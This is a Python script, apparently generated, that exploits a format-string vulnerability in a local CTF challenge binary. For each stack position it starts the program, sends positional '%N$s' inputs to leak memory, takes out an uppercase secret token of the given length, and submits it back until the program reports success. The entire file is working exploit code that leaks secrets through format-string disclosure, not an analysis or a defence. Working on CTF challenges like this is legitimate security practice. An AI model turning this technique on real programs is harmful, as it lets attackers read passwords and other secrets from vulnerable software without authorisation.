"""Standalone, generated CTF format-string disclosure probe (Linux/WSL).

The caller supplies TARGET and TOKEN_LENGTH before this module's source.
A separate process is used per guess; disclosure and submission occur in the
same process so randomly generated secrets are never reused across runs.
"""
import argparse
import os
import re
import select
import subprocess
import time

TARGET = globals().get("TARGET", "")
TOKEN_LENGTH = globals().get("TOKEN_LENGTH", 0)


def read_quiet(stream, idle=0.20, overall=2.0, limit=131072):
    """Read nonblocking Linux pipes until output settles or deadline expires."""
    output = bytearray()
    deadline = time.monotonic() + overall
    last = time.monotonic()
    fd = stream.fileno()
    while time.monotonic() < deadline and len(output) < limit:
        if time.monotonic() - last >= idle and output:
            break
        timeout = min(0.1, max(0, deadline - time.monotonic()))
        ready, _, _ = select.select([fd], [], [], timeout)
        if ready:
            chunk = os.read(fd, min(4096, limit - len(output)))
            if not chunk:
                break
            output.extend(chunk)
            last = time.monotonic()
    return bytes(output)


def attempt(binary, index, length, startup=2.0):
    process = subprocess.Popen(
        [binary], stdin=subprocess.PIPE, stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT, bufsize=0,
    )
    try:
        read_quiet(process.stdout, overall=startup)
        process.stdin.write(("%%%d$s\n" % index).encode("ascii"))
        process.stdin.flush()
        response = read_quiet(process.stdout, overall=2.0)
        # Avoid extracting a piece of a larger uppercase string.
        pattern = rb"(?<![A-Z])[A-Z]{%d}(?![A-Z])" % length
        for match in re.finditer(pattern, response):
            candidate = match.group(0)
            try:
                process.stdin.write(candidate)
                process.stdin.flush()
            except (BrokenPipeError, OSError):
                continue
            confirmation = read_quiet(process.stdout, overall=2.0)
            merged = confirmation.decode("utf-8", "replace")
            # A visible success marker proves that the guessed token was
            # accepted, rather than reporting an arbitrary uppercase string.
            if re.search(r"\b(correct|success|congratulations|accepted)\b", merged, re.I):
                return candidate.decode("ascii"), response + confirmation
        return None, response
    finally:
        if process.poll() is None:
            process.kill()
        process.communicate(timeout=3)


def main(argv=None):
    parser = argparse.ArgumentParser(description="Local Linux/WSL CTF format-string solver")
    parser.add_argument("binary", nargs="?", default=TARGET)
    parser.add_argument("--max-position", type=int, default=48)
    parser.add_argument("--token-length", type=int, default=TOKEN_LENGTH)
    args = parser.parse_args(argv)
    if not 1 <= args.token_length <= 128 or not 1 <= args.max_position <= 256:
        parser.error("token length or max position outside supported limits")
    if not os.path.isfile(args.binary):
        parser.error("binary not found: " + args.binary)
    print("Testing positional format-string reads...", flush=True)
    for index in range(1, args.max_position + 1):
        try:
            candidate, output = attempt(args.binary, index, args.token_length)
        except (OSError, ValueError, subprocess.TimeoutExpired):
            continue
        if candidate is not None:
            print("POSITION: %d" % index)
            print("PASSWORD: %s" % candidate)
            print("TARGET OUTPUT:")
            print(output.decode("utf-8", "replace"))
            return 0
    print("No validated token found. The primitive may not apply to this binary.")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
